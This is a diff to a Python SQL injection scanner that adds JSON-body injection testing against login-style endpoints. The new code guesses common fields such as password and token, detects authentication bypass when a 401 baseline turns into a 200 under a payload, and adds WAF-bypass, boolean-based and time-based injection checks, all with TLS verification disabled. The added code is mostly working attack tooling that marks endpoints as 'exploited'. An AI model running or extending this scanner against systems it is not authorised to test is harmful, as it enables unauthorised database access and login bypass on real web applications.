@@ -105,6 +105,75 @@ _SQL_LIKELY_PARAMS: frozenset = frozenset({
     "name", "title", "slug", "key",
 })
 
+# Campos JSON comunes para probar en endpoints sin query params (ej: POST /api/login)
+_JSON_COMMON_FIELDS: list = [
+    "email", "username", "user", "login", "password",
+    "q", "query", "search", "keyword", "term",
+    "id", "name", "value", "param", "input", "data",
+    "token", "key", "content", "message", "text",
+]
+
+# Cache para detección de endpoints que aceptan JSON (compartido entre llamadas)
+_json_accept_cache: dict = {}
+_json_accept_lock = threading.Lock()
+
+
+def _probe_accepts_json(base_url: str, headers: dict) -> bool:
+    """
+    Detecta si el endpoint acepta Content-Type: application/json.
+    Retorna True si la respuesta NO es 415 Unsupported Media Type.
+    Cachea el resultado por URL para no repetir el probe.
+    """
+    with _json_accept_lock:
+        if base_url in _json_accept_cache:
+            return _json_accept_cache[base_url]
+    try:
+        h = dict(headers)
+        h["Content-Type"] = "application/json"
+        r = requests.post(base_url, json={}, headers=h, verify=False, timeout=4)
+        accepts = r.status_code != 415
+    except Exception:
+        accepts = False
+    with _json_accept_lock:
+        _json_accept_cache[base_url] = accepts
+    return accepts
+
+
+# Solo 401 como auth gate estricto (403 puede ser WAF/IP block, muy propenso a FP)
+_AUTH_GATE_STATUSES: frozenset = frozenset({401})
+
+
+def _confirm_auth_bypass(base_url: str, param: str, payload: str,
+                         send_fn, json_headers: dict) -> bool:
+    """
+    Confirma que un auth bypass es real y no un fluke de timing/cache:
+    1. Re-envía el mismo payload una vez más y verifica que sigue retornando 200.
+    2. Verifica que la respuesta 200 tiene contenido sustancial (no vacía ni error disfrazado).
+    3. Re-verifica que el baseline sigue retornando 401 (descarta rate limit como causa).
+    """
+    try:
+        # Confirmación 1: re-enviar payload → debe seguir siendo 200
+        r_confirm = send_fn(base_url, param, payload, json_headers)
+        if r_confirm.status_code != 200:
+            return False
+        # Verificar que la respuesta tiene contenido real (>20 bytes y no es solo un error)
+        body = r_confirm.text.strip()
+        if len(body) < 20:
+            return False
+        body_lower = body.lower()
+        # Si el 200 contiene palabras de error comunes → falso positivo
+        _fp_keywords = ("invalid", "error", "fail", "unauthorized", "forbidden",
+                        "wrong", "incorrect", "bad request", "not found")
+        if all(kw in body_lower for kw in _fp_keywords[:2]):
+            return False
+        # Confirmación 2: re-verificar que baseline sigue siendo 401
+        r_base = send_fn(base_url, param, "NELUX_BENIGN_TEST", json_headers)
+        if r_base.status_code != 401:
+            return False
+        return True
+    except Exception:
+        return False
+
 
 def _sqli_test_boolean(base_url: str, param: str, method: str,
                         headers: dict, baseline_text: str) -> tuple:
@@ -231,7 +300,7 @@ def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
     sys.stdout.flush()
 
 
-    total_tasks = (len(urip) * 2 + len(urif)) * len(wordlist)
+    total_tasks = (len(urip) * 3 + len(urif) * 2) * len(wordlist)  # GET+POST+JSON (urip) + FORM+JSON (urif)
     current = 0
     lock = threading.Lock()
     vulnerable_endpoints = set()
@@ -244,6 +313,7 @@ def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
 
     # Cache para baselines y endpoints vulnerables
     baseline_cache = {}
+    baseline_status_cache = {}   # Almacena el HTTP status del baseline por endpoint
     form_cache = {}
     stdout_lock = threading.Lock()
 
@@ -419,8 +489,16 @@ def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
             # Cache de baseline para POST
             baseline_key = f"POST-{base_url}-{param}"
             if baseline_key not in baseline_cache:
-                baseline_cache[baseline_key] = get_baseline_response("post", base_url, data)
+                try:
+                    ph_b = get_headers(random_agent=random_agent, custom_headers=custom_headers)
+                    rb_post = requests.post(base_url, data={param: "TEST123"}, headers=ph_b, verify=False, timeout=5)
+                    baseline_cache[baseline_key] = rb_post.text.lower() if rb_post.status_code < 500 else ""
+                    baseline_status_cache[f"POST-{base_url}-{param}"] = rb_post.status_code
+                except Exception:
+                    baseline_cache[baseline_key] = get_baseline_response("post", base_url, data)
+                    baseline_status_cache[f"POST-{base_url}-{param}"] = 0
             baseline = baseline_cache[baseline_key]
+            post_baseline_status = baseline_status_cache.get(f"POST-{base_url}-{param}", 0)
 
             if ban.is_banned(parsed.netloc):
                 with lock:
@@ -437,7 +515,7 @@ def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
                     if vuln_manager.is_already_exploited(base_url, param):
                         return False
                     is_time_based = "TIME-BASED" in technique
-                    if not is_time_based:
+                    if not is_time_based and "AUTH-BYPASS" not in technique:
                         if vuln_manager.verify_sqli_false_positive(
                             base_url, "POST", param=param,
                             custom_headers=custom_headers, random_agent=random_agent
@@ -458,8 +536,20 @@ def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
                     urls_vulnerables.append(entry)
                     return True
 
+                # ── CAPA 0: Auth bypass (401 baseline → 200 con payload) ──
+                if (r.status_code == 200
+                        and post_baseline_status in _AUTH_GATE_STATUSES
+                        and base_url not in vulnerable_endpoints):
+                    def _send_post(u, p, v, h):
+                        return requests.post(u, data={p: v}, headers=h, verify=False, timeout=5)
+                    if _confirm_auth_bypass(base_url, param, payload, _send_post, ph):
+                        if _report_sqli_post(payload, "POST-AUTH-BYPASS"):
+                            current += 1
+                            update_progress(current, total_tasks)
+                            return
+
                 # ── CAPA 1: Error-based ────────────────────────────────────
-                if r.status_code in (200, 500) and is_sqli_error_response(r.text) and r.text.lower() != baseline:
+                elif r.status_code in (200, 500) and is_sqli_error_response(r.text) and r.text.lower() != baseline:
                     if _report_sqli_post(payload):
                         current += 1
                         update_progress(current, total_tasks)
@@ -611,6 +701,188 @@ def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
             current += 1
             update_progress(current, total_tasks)
 
+    def test_json_body(url, payload):
+        """Prueba inyección SQL en el body JSON (POST con Content-Type: application/json).
+        Soporta endpoints con query params en URL Y endpoints JSON-only sin params (ej: POST /api/login)."""
+        nonlocal current
+        parsed = urlparse(url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+        qs = parse_qs(parsed.query)
+
+        if _is_static_path(url):
+            with lock:
+                current += 1
+                update_progress(current, total_tasks)
+            return
+
+        if vuln_manager.should_skip_url(base_url, base_url_only=True):
+            with lock:
+                current += 1
+                update_progress(current, total_tasks)
+            return
+
+        headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
+        domain = parsed.netloc
+
+        if not _probe_accepts_json(base_url, headers):
+            with lock:
+                current += 1
+                update_progress(current, total_tasks)
+            return
+
+        if ban.is_banned(domain):
+            with lock:
+                current += 1
+                update_progress(current, total_tasks)
+            return
+
+        json_headers = dict(headers)
+        json_headers["Content-Type"] = "application/json"
+
+        # Si no hay query params, probar con campos JSON comunes (endpoints tipo POST /api/login)
+        fields_to_test = list(qs.keys()) if qs else _JSON_COMMON_FIELDS
+
+        for param in fields_to_test:
+            if _is_non_injectable_param(param):
+                continue
+            if vuln_manager.should_skip_url(base_url, param):
+                continue
+
+            baseline_key = f"JSON-{base_url}-{param}"
+            if baseline_key not in baseline_cache:
+                try:
+                    rb = requests.post(base_url, json={param: "TEST123"}, headers=json_headers,
+                                       verify=False, timeout=5)
+                    baseline_cache[baseline_key] = rb.text.lower() if rb.status_code < 500 else ""
+                    baseline_status_cache[baseline_key] = rb.status_code
+                except Exception:
+                    baseline_cache[baseline_key] = ""
+                    baseline_status_cache[baseline_key] = 0
+            baseline = baseline_cache[baseline_key]
+            baseline_status = baseline_status_cache.get(baseline_key, 0)
+
+            try:
+                r = requests.post(base_url, json={param: payload}, headers=json_headers,
+                                  verify=False, timeout=5)
+                ban.record(domain, r.status_code, r, base_url)
+
+                def _report_sqli_json(win_payload, technique="JSON-ERROR-BASED"):
+                    if vuln_manager.is_already_exploited(base_url, param):
+                        return False
+                    if "TIME-BASED" not in technique:
+                        if vuln_manager.verify_sqli_false_positive(
+                            base_url, "POST", param=param,
+                            custom_headers=custom_headers, random_agent=random_agent
+                        ):
+                            return False
+                    with lock:
+                        if base_url in vulnerable_endpoints:
+                            return False
+                        vulnerable_endpoints.add(base_url)
+                    vuln_manager.mark_as_exploited(base_url, param)
+                    vuln_manager.mark_as_exploited(base_url, base_url_only=True)
+                    with stdout_lock:
+                        print_vulnerability(
+                            f"\033[1;32m[JSON-POST][{technique}]\033[0m "
+                            f"{base_url} \033[2m(field: {param})\033[0m"
+                        )
+                    entry = (f"{base_url}?{param}={quote(win_payload, safe='')}|||JSON_BODY:true")
+                    if technique != "JSON-ERROR-BASED":
+                        entry += f"|||BYPASS_TECHNIQUE:{technique}"
+                    urls_vulnerables.append(entry)
+                    return True
+
+                # ── CAPA 0: Auth bypass (401 baseline → 200 con payload) ─────
+                if (r.status_code == 200
+                        and baseline_status in _AUTH_GATE_STATUSES
+                        and base_url not in vulnerable_endpoints):
+                    def _send_json(u, p, v, h):
+                        return requests.post(u, json={p: v}, headers=h, verify=False, timeout=5)
+                    if _confirm_auth_bypass(base_url, param, payload, _send_json, json_headers):
+                        if _report_sqli_json(payload, "JSON-AUTH-BYPASS"):
+                            break
+
+                # ── CAPA 1: Error-based ────────────────────────────────────
+                elif r.status_code in (200, 500) and is_sqli_error_response(r.text) and r.text.lower() != baseline:
+                    if _report_sqli_json(payload):
+                        break
+
+                # ── CAPA 2: WAF bypass ────────────────────────────────────
+                elif r.status_code in (403, 406, 429):
+                    for wp in _SQLI_WAF_BYPASS_PAYLOADS:
+                        try:
+                            rw = requests.post(base_url, json={param: wp}, headers=json_headers,
+                                               verify=False, timeout=5)
+                            if rw.status_code in (200, 500) and is_sqli_error_response(rw.text):
+                                if _report_sqli_json(wp, "JSON-WAF-BYPASS"):
+                                    break
+                        except Exception:
+                            continue
+
+                # ── CAPA 3: Boolean-based ─────────────────────────────────
+                elif r.status_code == 200 and r.text.lower() != baseline and base_url not in vulnerable_endpoints:
+                    len_b = max(len(baseline), 1)
+                    for true_p, false_p in _SQLI_BOOLEAN_PAIRS[:3]:
+                        try:
+                            rt = requests.post(base_url, json={param: true_p}, headers=json_headers,
+                                               verify=False, timeout=5)
+                            rf = requests.post(base_url, json={param: false_p}, headers=json_headers,
+                                               verify=False, timeout=5)
+                            if (abs(len(rt.text) - len_b) / len_b < 0.15
+                                    and abs(len(rf.text) - len_b) / len_b >= 0.20):
+                                if _report_sqli_json(true_p, "JSON-BOOLEAN-BASED"):
+                                    break
+                        except Exception:
+                            continue
+
+                    # ── CAPA 4: Time-based (params sospechosos) ───────────
+                    if param.lower() in _SQL_LIKELY_PARAMS and base_url not in vulnerable_endpoints:
+                        try:
+                            t0 = _time.time()
+                            requests.post(base_url, json={param: "1"}, headers=json_headers,
+                                          verify=False, timeout=7)
+                            base_t = _time.time() - t0
+                        except Exception:
+                            base_t = 0.5
+
+                        for tp, db in _SQLI_TIME_PAYLOADS[:2]:
+                            try:
+                                s1 = _time.time()
+                                requests.post(base_url, json={param: tp}, headers=json_headers,
+                                              verify=False, timeout=10)
+                                e1 = _time.time() - s1
+                                if e1 - base_t < 3 * 0.75:
+                                    continue
+                                s2 = _time.time()
+                                requests.post(base_url, json={param: tp}, headers=json_headers,
+                                              verify=False, timeout=10)
+                                e2 = _time.time() - s2
+                                if e2 - base_t >= 3 * 0.75:
+                                    _report_sqli_json(tp, f"JSON-TIME-BASED[{db}]")
+                                    break
+                            except requests.exceptions.Timeout:
+                                try:
+                                    requests.post(base_url, json={param: tp}, headers=json_headers,
+                                                  verify=False, timeout=10)
+                                except requests.exceptions.Timeout:
+                                    _report_sqli_json(tp, f"JSON-TIME-BASED[{db}]")
+                                    break
+                                except Exception:
+                                    pass
+                            except Exception:
+                                continue
+
+            except requests.exceptions.Timeout:
+                continue
+            except requests.exceptions.RequestException:
+                continue
+            except Exception:
+                continue
+
+        with lock:
+            current += 1
+            update_progress(current, total_tasks)
+
     # No materializar millones de tareas/futures: agota RAM y el kernel mata el proceso (zsh: killed).
     pending_max = max(threads * 200, 2000)
 
@@ -627,12 +899,14 @@ def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
             for payload in wordlist:
                 pending.append(executor.submit(test_url, url, payload))
                 pending.append(executor.submit(test_post, url, payload))
+                pending.append(executor.submit(test_json_body, url, payload))
                 if len(pending) >= pending_max:
                     drain_batch(pending)
                     pending.clear()
         for url in urif:
             for payload in wordlist:
                 pending.append(executor.submit(test_form, url, payload))
+                pending.append(executor.submit(test_json_body, url, payload))
                 if len(pending) >= pending_max:
                     drain_batch(pending)
                     pending.clear()
